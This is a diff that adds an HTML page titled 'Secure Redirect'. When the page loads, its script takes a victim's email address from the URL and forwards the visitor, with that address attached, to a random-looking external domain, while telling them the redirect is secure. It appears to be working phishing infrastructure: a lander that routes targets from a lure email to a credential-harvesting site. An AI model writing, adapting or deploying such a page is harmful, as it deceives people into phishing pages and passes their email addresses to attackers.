@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect</title>
+    <!-- Force HTTPS -->
+    <script>
+        if (window.location.protocol !== 'https:') {
+            window.location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
+        }
+    </script>
+    <script>
+        // Single destination configuration
+        const DESTINATION_URL = 'https://byramkclmzrx6yxl6pxq.zvzxssh.es/nZfheMCqu!zWuM/';  // Replace with your specific URL
+
+        // Get email parameter
+        function getEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('e');
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Main redirect handler
+        function handleRedirect() {
+            // Get email parameter
+            const email = getEmailParam();
+
+            // Validate email
+            if (!email || !isValidEmail(email)) {
+                console.error('Invalid email parameter');
+                window.location.href = 'error.html';
+                return;
+            }
+
+            // Build final URL with email parameter
+            const finalUrl = new URL(DESTINATION_URL);
+            finalUrl.searchParams.set('e', email);
+
+            // Perform the redirect
+            window.location.href = finalUrl.toString();
+        }
+
+        // Execute when page loads
+        window.onload = handleRedirect;
+    </script>
+</head>
+<body>
+    <div id="loading" style="text-align: center; padding: 20px; font-family: Arial, sans-serif;">
+        <h2>Secure Redirect in Progress</h2>
+        <p>Please wait while we redirect you securely...</p>
+    </div>
+</body>
+</html> 
